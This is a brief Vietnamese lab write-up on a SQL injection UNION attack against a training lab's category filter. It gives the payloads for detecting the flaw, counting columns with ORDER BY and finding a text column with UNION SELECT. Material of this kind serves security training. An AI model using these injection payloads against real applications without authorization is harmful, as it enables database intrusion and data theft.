# Lab: SQL injection UNION attack, finding a column containing text

## 1. Phát hiện

Payload kiểm tra:

```text
/filter?category=Gifts'--
```

## 2. Đếm số cột

Payload:

```text
'+order+by+3--
```

Kết luận: truy vấn trả về 3 cột.

## 3. Kiểm tra kiểu dữ liệu của 3 cột

Payload:

```text
'+union+select+1,'CReGOv',1--
```

## 4. Kết luận

Đã xác định được số cột và vị trí cột string để tiếp tục các bước UNION-based SQLi.
